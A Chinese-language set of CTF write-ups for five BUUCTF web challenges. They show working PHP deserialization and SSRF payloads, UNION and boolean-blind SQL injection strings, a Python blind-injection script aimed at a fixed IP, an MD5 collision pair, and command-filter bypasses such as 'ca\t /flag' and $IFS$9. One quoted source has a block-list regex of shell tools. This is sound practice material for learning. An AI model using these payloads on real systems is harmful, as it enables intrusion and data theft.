---
title: buu刷题记录
---

# [网鼎杯 2020 青龙组]AreUSerialz

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

打开容器就可以看到代码，直接审计

要我们传入str参数

再通过is_valid函数，

```php
 if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
```

要求传入字符串的每个ascii在32到125之间。

这里是第一个问题，在我们构造序列化的时候protected类型会出现不可见字符，那要如何绕过呢？

我自己想到的方法是在序列化时用**大写S**表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。

在看wp后发现还有一种方法，那就是php7.1对类型不敏感，可以在本地构造序列化时改为public类型即可不用处理不可见字符。

```php
function __destruct() {
        if($this->op === "2")
            $this->op = "1";
```

这里是一个强比较如果我们输入字符串2就会被强制转换成1，但是我们要利用到read函数读取flag所以就要令op=2，所以我们可以输入int型2绕过，再进入到process函数中。

直接使用public构造

```php
<?php
 
class FileHandler {
 
    public $op = 2;
    public  $filename = "flag.php";
    public  $content;
}
 
$a = new FileHandler();
$b = serialize($a);
echo $b;
 
?>
```

或者用一开始提到的16进制方法

得到payload后修改不可见字符

```php
<?php
highlight_file(__FILE__);
	class FileHandler {
        protected $op = 2;
        protected $filename = "flag.php";
        protected $content;
    }
    $a = new FileHandler();
        $b = serialize($a);
        echo($b);
?>
```

主要知识点：1.protected/private类型的属性序列化后产生不可打印字符，public类型则不会

2.PHP7.1+对类的属性类型不敏感

3.强弱类型比较“===”、“==”的利用

4.在filename那里还可以使用php://filter伪协议读取，因为file_get_content()可以读取php://filter伪协议。

# [网鼎杯 2018]Fakebook

打开题目

一个登陆界面和一个注册界面，打开的第一反应是sql注入，可是没找到注入点。

扫描网站发现robots.txt,得到user.php.bak。

下载得到：

```php
<?php

class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)   //构建函数
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();    // curl_init(url)函数，初始化一个新的会话，返回一个cURL句柄

        curl_setopt($ch, CURLOPT_URL, $url);   // curl_setopt设置 cURL 传输选项，为 cURL 会话句柄设置选项
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);    // curl_exec — 执行 cURL 会话，返回访问结果
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);     // curl_getinfo — 获取一个cURL连接资源句柄的信息，获取最后一次传输的相关信息。返回状态码。
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

发现ssrf漏洞。

过滤做得很少，如果没有isValidBlog函数就可以直接用file协议读取。

先注册一个账号

进入后发现注入点。

```php
http://bec1c1e2-0a6e-43a3-8e55-7243a08ec243.node4.buuoj.cn/view.php?no=1
```

进行注入：

```
view.php?no=1 order by 4--+
```

字段数为4

联合查询得到显注点，union被过滤，用/**/绕过。

```
view.php?no=0 union/**/select 1,2,3,4--+
```

显著点为2

爆库

```
view.php?no=0 union/**/select 1,database(),3,4--+  //fakebook
```

爆表

```
view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+  //user
```

爆列

```
view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'--+   //no,username,passwd,data
```

爆数据

```
view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users--+
```

发现我们注册的blog是以序列化存入的

```
O:8:"UserInfo":3:{s:4:"name";s:3:"qqq";s:3:"age";i:1;s:4:"blog";s:20:"http://www.baidu.com";} 
```

data是一个序列化的字符串，据此构造我们的ssrf的payload因为网站没做任何过滤。

```php
<?php

class UserInfo
{
    public $name = "1";
    public $age = 0;
    public $blog = "file:///var/www/html/flag.php";
	
}

$a = new UserInfo();
echo serialize($a);
?>
```

传入

```php
view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' --+
```

打开页面源代码看到一串base64点开就是flag。

知识点：

1.sql注入（显注）

2.反序列化，写入file协议读取文件

3.ssrf漏洞。

# [安洵杯 2019]easy_web

打开容器，看到url处有两个参数img和cmd

img的参数通过了两次base64解码和一次hex解码得到555.png

猜测有文件包含漏洞。

依葫芦画瓢将index.php进行编码读取：

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

绕过点：

```php
 if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
```

md5强碰撞。

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

cmd处过滤了ls但是没过滤dir，当前目录并没有flag

用dir%20/查询根目录，发现flag。

虽然在正则处

```php
preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
```

过滤了cat，但是没有过滤\

https://blog.csdn.net/weixin_41463193/article/details/83539168

这是对php中反斜杠的讲解。

利用ca\t%20/flag读取flag。

知识点：

1.文件包含漏洞，对url处要敏感。

2.md5的强碰撞（常见）

3.对命令执行漏洞的绕过。

# [WUSTCTF2020]颜值成绩查询

题目给了提示了，查询，那跟sql脱不了干系。

输入1查询，看见url处多出了一个参数。

```
?stunum=1
```

挨个查询，没啥发现。

直接试一下bool盲注

```
stunum = if(length(database())>1,1,0)
```

发现返回正常界面

```
stunum = if(length(database())>3,1,0)
```

又变回错误的界面了。

说明存在bool盲注

测试得到过滤了空格

爆表：

```
if((select(substr(group_concat(table_name),1,1))from/**/information_schema.tables/**/where/**/table_schema=database())='a',1,2)
```

爆列：

```
if((select(substr(group_concat(column_name),1,1))from/**/information_schema.columns/**/where/**/table_schema=database())='a',1,2)
```

爆数据：

```
if((select(substr(group_concat(value),1,1))from/**/flag)='a',1,2)
```

写脚本

```python
import requests

s=requests.session()
flag = ''
for i in range(1,50):
    for j in '{qwertyuiopasdfghjklzxcvbnm_@#$%^&*()_+=-0123456789,./?|}':
        url="http://101.200.53.102:10114/?stunum=if((select(substr(group_concat(table_name),{},1))from/**/information_schema.tables/**/where/**/table_schema=database())='{}',1,2)".format(i,j)
        #url="http://101.200.53.102:10114/?stunum=if((select(substr(group_concat(column_name),{},1))from/**/information_schema.columns/**/where/**/table_schema=database())='{}',1,2)".format(i,j) 
        #url="http://101.200.53.102:10114/?stunum=if((select(substr(group_concat(value),{},1))from/**/flag)='{}',1,2)".format(i,j)
        c = s.get(url ,timeout=3)
        #print c.text
        if 'Hi admin' in c.text:
            flag += j
            print(flag)
            break
```

就可以跑出flag了。

# [WUSTCTF2020]朴实无华

打开容器

只有一句hackme

然后什么都没有了，这种时候就要扫一扫有没有什么东西了。

扫出了robots.txt

```
User-agent: *
Disallow: /fAke_f1agggg.php
```

但是打开是一个假的flag

后来在响应头处看到一个lookatme字段写着fl4g.php

拿到代码，开始审计

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.</br>";
    }else{
        die("閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�");
    }
}else{
    die("鍘婚潪娲插惂");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.</br>";
   else
       die("鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�");
}else{
    die("鍘婚潪娲插惂");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.</br>";
        system($get_flag);
    }else{
        die("蹇埌闈炴床浜�");
    }
}else{
    die("鍘婚潪娲插惂");
}
?> 
```

电脑问题都是乱码，不影响，只要不让程序进入die那一步就行，

第一级：

```php
 if(intval($num) < 2020 && intval($num + 1) > 2021)
```

查阅资料发现

```php
echo intval(1e10);    // 1410065408
echo intval('1e10');  // 1
```

即作为字符串时，intval会在e前截断掉，只接受到e前面的内容。

```php
<?php
echo intval('2e4');//2
echo('<br>');
echo intval('2e4'+1);//20001
?>
```

测试后发现有用,可以绕过第一关

在这里直接输入2e4就行了，应该是自动转换成字符串了。

第二层

```php
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
```

要求我们输入一个值，在md5加密后还要与原本的值相等

那只要使这个值为0e开头即可那么传入后会被识别为0，加密后还是为0

那么就可以满足要求了

那么来到第三层

```php
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
```

这里要求有点多

1. 要求传入参数get_flag，并且不能有空格
2. 如果get_flag里面有cat，就会被替换成wctf2020
3. 传入的get_flag会当作系统命令被执行

空格容易，用$IFS$9代替即可，

cat被过滤了，但是可以用tac代替

那么先找flag是哪个文件，

用ls命令

```
404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt 
```

应该就是那个最长的flag文件了

tac一下

就能读出flag了

```
flag{235bdade-9e69-4062-b0fc-f369dae7b5b3} 
```



